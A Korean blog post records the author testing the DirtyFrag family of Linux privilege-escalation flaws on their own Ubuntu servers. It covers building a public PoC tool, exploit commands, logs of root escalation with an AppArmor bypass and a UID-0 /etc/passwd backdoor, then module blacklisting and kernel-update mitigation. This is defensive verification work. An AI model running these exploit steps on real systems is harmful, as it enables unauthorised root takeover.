---
title: "DirtyFrag (CVE-2026-43284) 취약점 테스트"
category: [Security]
toc: true
toc_label: "이 페이지 목차"
---

DirtyFrag 보안 취약점을 테스트 해 보았다.

## DirtyFrag 취약점 분석
DirtyFrag ([CVE-2026-43284](https://nvd.nist.gov/vuln/detail/CVE-2026-43284)) 보안 취약점은 아래 페이지에서 자세한 분석 사항을 볼 수 있다.
- [Linux 루트 권한 획득 취약점 Dirty Frag 분석](https://www.igloopedia.com/35ff216a-760c-8029-8d94-d3f8cc709510)

## DirtyClone 취약점 분석
DirtyClone ([CVE-2026-43503](https://nvd.nist.gov/vuln/detail/CVE-2026-43503)) 보안 취약점도 발견되었는데, 이는 DirtyFrag 계열의 4번째 변종이다.  
아래 페이지에서 자세한 분석 사항을 볼 수 있다.
- [Dissecting and Exploiting Linux LPE Variant: DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [DirtyClone과 끊임없이 재발하는 Shared-Frag 마커 버그](https://tuxcare.com/ko/blog/dirty-clone-cve/)

## Copy Fail, Dirty Frag 용 PoC 코드
GitHub에서 Copy Fail, Dirty Frag 취약점을 PoC 하는 [DIRTYFAIL](https://github.com/KaraZajac/DIRTYFAIL) 툴을 발견하여서, 실제로 테스트 해 보기로 하였다.  
아래와 같이 PoC 소스를 다운받아서 빌드한다.
```sh
$ git clone https://github.com/KaraZajac/DIRTYFAIL.git
$ cd DIRTYFAIL/
$ make
```
결과로 dirtyfail 실행 파일이 빌드된다.  
<br>

참고로 만약에 타겟 서버에 GCC 툴체인이 설치되지 않은 경우라면, 아래와 같이 본인의 호스트에서 **static**으로 빌드한 후에 타겟 서버에 복사하면, 실행시킬 수 있다.
```sh
$ make static
```
<br>

이제 dirtyfail 툴을 옵션없이 실행하면 취약점을 스캔한 후에 결과를 출력한다. 또, 아래와 같이 도움말을 보면 취약점에 대한 각각의 exploit 옵션을 확인할 수 있다.
```sh
$ ./dirtyfail --help
Usage: ./dirtyfail [MODE] [OPTIONS]

Modes (pick one; default is --scan):
  ...
  --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead
  --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP (v4)
  --exploit-esp6         real PoC: flip /etc/passwd UID via xfrm-ESP (v6)
  --exploit-rxrpc        real PoC: empty /etc/passwd root pwd via rxkad
  --exploit-gcm          real PoC: flip /etc/passwd UID via rfc4106(gcm(aes))
```

## PoC 테스트
내가 관리 중인 Ubuntu 18.04, Ubuntu 22.04, Ubuntu 24.04 서버에서 (모두 apt update/upgrade는 최신 상태) 확인해 보았는데, 18.04 서버는 root 권한이 획득되었고, 22.04 서버는 시스템 reboot 전에는 root 권한이 획득되었지만 reboot 이후(즉, 업데이트된 Kernel 버전 적용)에는 root 권한 획득에 실패하였고, 24.04 서버에서는 처음부터 root 권한 획득에 실패하였다.  
아래에 사례별 로그를 붙여 넣었다.

### Ubuntu 18.04 테스트
먼저 현재 상태를 확인해 본다.
```sh
$ uname -r
4.15.0-213-generic
$ echo $UID
1000
```

실행하니 아래와 같이 Copy Fail, Dirty Frag에 취약하다고 나온다.
```sh
$ ./dirtyfail

 ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗
 ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║
 ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║
 ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║
 ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
            Copy Fail + Dirty Frag detector & PoC
            CVE-2026-31431 / 43284 / 43500

[*] running full scan — five detectors

[*] Copy Fail (CVE-2026-31431) — detection
[i] kernel 4.15.x (affected lines: 6.12, 6.17, 6.18)
[+] AF_ALG + authencesn(hmac(sha256),cbc(aes)) loadable
[*] triggering primitive against /tmp/copyfail-sentinel.ZL32QX with marker 'PWND'
[!] VULNERABLE — marker 'PWND' landed at sentinel offset 0
[!] apply the upstream fix (commit a664bf3d or distro backport)
[!] interim mitigation: blacklist the algif_aead module

[*] Dirty Frag — xfrm-ESP variant (CVE-2026-43284) — detection
[i] kernel 4.15.x
[i] esp4 currently loaded: no
[i] esp6 currently loaded: no
[i] unprivileged user namespace: allowed
[i] no esp4/esp6 currently loaded; the kernel will autoload them on first SA registration. We treat this as still vulnerable.
[!] VULNERABLE (preconditions met) — userns + xfrm SA registration available, kernel within affected window
[!] apply mainline patch f4c50a4034e6 or your distro's backport
[!] interim mitigation: `dirtyfail --mitigate` or manually blacklist esp4/esp6 in /etc/modprobe.d/
[i] re-run with `--scan --active` for an empirical sentinel-STORE probe

[*] Dirty Frag — IPv6 xfrm-ESP variant (CVE-2026-43284 v6 path) — detection
[i] kernel 4.15.x
[i] esp6 currently loaded: no
[i] unprivileged user namespace: allowed
[!] VULNERABLE (preconditions met) — v6 xfrm SA registration available
[!] Apply mainline patch f4c50a4034e6 (covers both v4 and v6)
[!] Some distro backports may have shipped v4-only — test both paths
[i] re-run with `--scan --active` for an empirical sentinel-STORE probe

[*] Dirty Frag — RxRPC variant (CVE-2026-43500) — detection
[i] kernel 4.15.x
[i] rxrpc currently loaded: no
[i] AF_RXRPC socket: denied
[+] rxrpc not present and AF_RXRPC socket family rejected — RxRPC variant unreachable

[*] Copy Fail GCM variant — detection
[i] kernel 4.15.x
[+] AF_ALG + rfc4106(gcm(aes)) loadable
[i] unprivileged user namespace: allowed
[!] VULNERABLE — GCM-variant of xfrm-ESP page-cache write reachable
[!] apply mainline patch f4c50a4034e6 or distro backport
[i] re-run with `--scan --active` for an empirical sentinel-STORE probe

[*] scan summary:
[i]   Copy Fail (algif_aead, CVE-2026-31431):     VULNERABLE
[i]   Dirty Frag ESP v4 (CVE-2026-43284):         VULNERABLE
[i]   Dirty Frag ESP v6 (CVE-2026-43284 v6):      VULNERABLE
[i]   Dirty Frag RxRPC  (CVE-2026-43500):         preconditions missing
[i]   Copy Fail GCM variant (xfrm rfc4106):       VULNERABLE
```

아래와 같이 explot 해보자.
```sh
$ ./dirtyfail --exploit-esp

 ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗
 ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║
 ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║
 ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║
 ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
            Copy Fail + Dirty Frag detector & PoC
            CVE-2026-31431 / 43284 / 43500

[!] running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)
[*] Dirty Frag (xfrm-ESP) — exploit
[*] /etc/passwd UID for yrpark99: '1000' at offset 2849
[!] about to run xfrm-ESP page-cache write against /etc/passwd
[!] this enters a fresh user/net namespace, registers an XFRM SA, and sends an ESP-in-UDP packet whose payload is the /etc/passwd page from offset 2849
[!] on success the page cache will report 'yrpark99' as UID 0
[!] cleanup: dirtyfail --cleanup, or `echo 3 > /proc/sys/vm/drop_caches`
    Type DIRTYFAIL and press enter to proceed: DIRTYFAIL
[!] =================================================================
[!]  SSH LOCKOUT WARNING
[!] =================================================================
[!]  You are running this exploit OVER SSH against your OWN account.
[!]  The page-cache write will mark 'yrpark99' as uid 0 in /etc/passwd.
[!]  Once that lands:
[!]    - sshd looks up 'yrpark99', sees uid 0
[!]    - StrictModes rejects ~/.ssh/authorized_keys (owner uid 1000
[!]      != logging-in uid 0) → publickey auth fails
[!]    - PAM password auth also fails (uid mismatch)
[!]  Recovery requires console access to drop_caches or reboot.
[!]  If this is what you want, type YES_BREAK_SSH below.
[!]  Otherwise consider --exploit-backdoor (targets a nologin line
[!]  instead of your account, doesn't break SSH).
[!] =================================================================
    Type YES_BREAK_SSH and press enter to proceed: YES_BREAK_SSH
[*] apparmor bypass armed — re-execing self via crun/chrome profile
[+] apparmor bypass complete — uid=0, in fresh userns
[+] inner: XFRM SA registered with seq_hi='0000'
[+] inner: ESP-in-UDP trigger fired at uid_off=2849
[+] page cache now reports yrpark99 with uid 0
[+] invoking 'su yrpark99' in init namespace — enter your password for REAL root
Password:
```

아래와 같이 id를 확인해 보면 root로 변경되었다. 😨
```sh
$ echo $UID
0
```

추가로 이 PoC는 백도어 수단으로 /etc/passwd 파일에서 해당 유저에 대하여 UID 값을 영구적으로 `0`(즉, root)으로 변경한다. (따라서 백도어를 제거하려면, 이 파일에서 다시 원래 유저 ID 값으로 되돌려야 함)  
<br>

Ubuntu 18.04는 시스템 업데이트를 최신으로 해도 이 보안 취약점이 해결이 되지 않는데, Ubuntu의 공식 보안 공지에 따르면 Ubuntu 18.04 Generic 커널은 **4.15.0-251.263** 버전부터 이 취약점이 수정되었다고 한다. 그런데 Ubuntu 18.04는 이미 Standard Support가 종료되었고, 따라서 4.15.0-251 커널은 일반 apt upgrade로는 제공되지 않고, Ubuntu Pro(ESM) 가입 시스템에서만 보안 업데이트를 받을 수 있다.  
따라서 아래와 같은 선택지가 있겠다.
- Ubuntu 20.04 또는 22.04 이상으로 업그레이드
- Ubuntu 18.04에서 Ubuntu Pro를 활성화하여 4.15.0-251 이상으로 Kernel 업데이트
- Ubuntu 18.04에서 esp4, esp6, rxrpc 모듈을 비활성화

이 서버의 경우 Ubuntu 업그레이드가 어려운 상황이므로, esp4, esp6, rxrpc 모듈들을 비활성화하는 방법을 선택하였다.
아래와 같이 각 모듈 상태를 얻을 수 있다.
```sh
$ modinfo esp4
$ modinfo esp6
$ modinfo rxrpc
```
아래와 같이 rmmod 명령으로 각 모듈들을 제거할 수 있다.
```sh
$ sudo modprobe -r esp4 esp6 rxrpc
```

하지만, 이 방법은 시스템이 reboot 되면 다시 수행해야 하므로, 아래와 같이 영구적으로 로딩을 막는 방법을 사용하였다.
```sh
$ echo "install esp4 /bin/false" | sudo tee /etc/modprobe.d/dirty-frag.conf
$ echo "install esp6 /bin/false" | sudo tee -a /etc/modprobe.d/dirty-frag.conf
$ echo "install rxrpc /bin/false" | sudo tee -a /etc/modprobe.d/dirty-frag.conf
$ sudo update-initramfs -u
$ sudo reboot
```

이후 아래와 같이 확인해 본다.
```sh
lsmod | egrep 'esp4|esp6|rxrpc'
```
결과로 아무것도 출력되지 않으면 성공이다.  
<br>

이제 다시 재테스트 해 보았다. (아래 캡쳐 참조)
```sh
$ ./dirtyfail --exploit-esp

 ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗
 ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║
 ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║
 ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║
 ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
            Copy Fail + Dirty Frag detector & PoC
            CVE-2026-31431 / 43284 / 43500

[!] running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)
[*] Dirty Frag (xfrm-ESP) — exploit
[*] /etc/passwd UID for yrpark99: '1000' at offset 2364
[!] about to run xfrm-ESP page-cache write against /etc/passwd
[!] this enters a fresh user/net namespace, registers an XFRM SA, and sends an ESP-in-UDP packet whose payload is the /etc/passwd page from offset 2364
[!] on success the page cache will report 'yrpark99' as UID 0
[!] cleanup: dirtyfail --cleanup, or `echo 3 > /proc/sys/vm/drop_caches`
    Type DIRTYFAIL and press enter to proceed: DIRTYFAIL
[!] =================================================================
[!]  SSH LOCKOUT WARNING
[!] =================================================================
[!]  You are running this exploit OVER SSH against your OWN account.
[!]  The page-cache write will mark 'yrpark99' as uid 0 in /etc/passwd.
[!]  Once that lands:
[!]    - sshd looks up 'yrpark99', sees uid 0
[!]    - StrictModes rejects ~/.ssh/authorized_keys (owner uid 1000
[!]      != logging-in uid 0) → publickey auth fails
[!]    - PAM password auth also fails (uid mismatch)
[!]  Recovery requires console access to drop_caches or reboot.
[!]  If this is what you want, type YES_BREAK_SSH below.
[!]  Otherwise consider --exploit-backdoor (targets a nologin line
[!]  instead of your account, doesn't break SSH).
[!] =================================================================
    Type YES_BREAK_SSH and press enter to proceed: YES_BREAK_SSH
[*] apparmor bypass armed — re-execing self via crun/chrome profile
[+] apparmor bypass complete — uid=0, in fresh userns
[-] XFRM_MSG_NEWSA: Protocol not supported
[-] inner exploit failed (exit=3)
```
기대대로 이번에는 explot이 실패하였다. 😂

### Ubuntu 22.04 테스트
현재 상태는 다음과 같다.
```sh
$ uname -r
6.8.0-107-generic
$ echo $UID
1000
```

실행하니 아래와 같이 Dirty Frag에 취약하다고 나온다.
```sh
$ ./dirtyfail

 ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗
 ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║
 ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║
 ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║
 ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
            Copy Fail + Dirty Frag detector & PoC
            CVE-2026-31431 / 43284 / 43500

[*] running full scan — five detectors

[*] Copy Fail (CVE-2026-31431) — detection
[i] kernel 6.8.x (affected lines: 6.12, 6.17, 6.18)
[+] authencesn template not loadable (No such file or directory) — NOT vulnerable

[*] Dirty Frag — xfrm-ESP variant (CVE-2026-43284) — detection
[i] kernel 6.8.x
[i] esp4 currently loaded: yes
[i] esp6 currently loaded: no
[i] unprivileged user namespace: allowed
[!] VULNERABLE (preconditions met) — userns + xfrm SA registration available, kernel within affected window
[!] apply mainline patch f4c50a4034e6 or your distro's backport
[!] interim mitigation: `dirtyfail --mitigate` or manually blacklist esp4/esp6 in /etc/modprobe.d/
[i] re-run with `--scan --active` for an empirical sentinel-STORE probe

[*] Dirty Frag — IPv6 xfrm-ESP variant (CVE-2026-43284 v6 path) — detection
[i] kernel 6.8.x
[i] esp6 currently loaded: no
[i] unprivileged user namespace: allowed
[!] VULNERABLE (preconditions met) — v6 xfrm SA registration available
[!] Apply mainline patch f4c50a4034e6 (covers both v4 and v6)
[!] Some distro backports may have shipped v4-only — test both paths
[i] re-run with `--scan --active` for an empirical sentinel-STORE probe

[*] Dirty Frag — RxRPC variant (CVE-2026-43500) — detection
[i] kernel 6.8.x
[i] rxrpc currently loaded: yes
[i] AF_RXRPC socket: denied
[!] VULNERABLE — RxRPC variant of Dirty Frag is reachable
[!] apply mitigation: `dirtyfail --mitigate` (blacklists rxrpc + others)
[!] or manually: blacklist rxrpc + drop_caches
[i] re-run with `--scan --active` for an empirical sentinel-STORE probe

[*] Copy Fail GCM variant — detection
[i] kernel 6.8.x
[+] rfc4106(gcm(aes)) not loadable — GCM variant unreachable

[*] scan summary:
[i]   Copy Fail (algif_aead, CVE-2026-31431):     preconditions missing
[i]   Dirty Frag ESP v4 (CVE-2026-43284):         VULNERABLE
[i]   Dirty Frag ESP v6 (CVE-2026-43284 v6):      VULNERABLE
[i]   Dirty Frag RxRPC  (CVE-2026-43500):         VULNERABLE
[i]   Copy Fail GCM variant (xfrm rfc4106):       preconditions missing
```

아래와 같이 explot 해보자.
```sh
$ ./dirtyfail --exploit-esp

 ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗
 ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║
 ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║
 ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║
 ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗
 ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝
            Copy Fail + Dirty Frag detector & PoC
            CVE-2026-31431 / 43284 / 43500

[!] running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)
[*] Dirty Frag (xfrm-ESP) — exploit
[*] /etc/passwd UID for yrpark99: '1000' at offset 2849
[!] about to run xfrm-ESP page-cache write against /etc/passwd
[!] this enters a fresh user/net namespace, registers an XFRM SA, and sends an ESP-in-UDP packet whose payload is the /etc/passwd page from offset 2849
[!] on success the page cache will report 'yrpark99' as UID 0
[!] cleanup: dirtyfail --cleanup, or `echo 3 > /proc/sys/vm/drop_caches`
    Type DIRTYFAIL and press enter to proceed: DIRTYFAIL
[!] =================================================================
[!]  SSH LOCKOUT WARNING
[!] =================================================================
[!]  You are running this exploit OVER SSH against your OWN account.
[!]  The page-cache write will mark 'yrpark99' as uid 0 in /etc/passwd.
[!]  Once that lands:
[!]    - sshd looks up 'yrpark99', sees uid 0
[!]    - StrictModes rejects ~/.ssh/authorized_keys (owner uid 1000
[!]      != logging-in uid 0) → publickey auth fails
[!]    - PAM password auth also fails (uid mismatch)
[!]  Recovery requires console access to drop_caches or reboot.
[!]  If this is what you want, type YES_BREAK_SSH below.
[!]  Otherwise consider --exploit-backdoor (targets a nologin line
[!]  instead of your account, doesn't break SSH).
[!] =================================================================
    Type YES_BREAK_SSH and press enter to proceed: YES_BREAK_SSH
[*] apparmor bypass armed — re-execing self via crun/chrome profile
[+] apparmor bypass complete — uid=0, in fresh userns
[+] inner: XFRM SA registered with seq_hi='0000'
[+] inner: ESP-in-UDP trigger fired at uid_off=2849
[+] page cache now reports yrpark99 with uid 0
[+] invoking 'su yrpark99' in init namespace — enter your password for REAL root
Password:
```

이제 아래와 같이 id를 확인해 보면, root 권한이 획득되었다. 😓
```sh
$ echo $UID
0
```

원인은 내가 apt upgrade는 최신으로 했었지만, 시스템을 reboot 하지 않아서 업데이트된 Kernel이 적용되지 않아서였다. 시스템을 reboot 한 후에 다시 Kernel 버전을 확인해 보니, 아래와 같이 정상적으로 Kernel이 업데이트되었다. (Ubuntu 6.8.0-124는 Canonical에서 수정했다고 발표한 버전임)
```sh
$ uname -r
6.8.0-124-generic
```

이후 다시 dirtyfail 툴로 스캔하면 이전과 동일한 항목들이 VULNERABLE 하다고 표시되지만, 실제로 exploit 테스트를 해 보면 실패하였다. 👍

## 맺음말
AI의 발전으로 오래된 Kernel의 보안 취약점이 계속해서 발견되고 있고, 패치 또한 빠르게 진행되고 있다. 제로 트러스트 보안 개념에 따라 시스템을 항상 최신으로 업데이트해 두어야 악의적인 내부 공격자의 공격도 방어할 수 있는 시대가 된 것 같다.
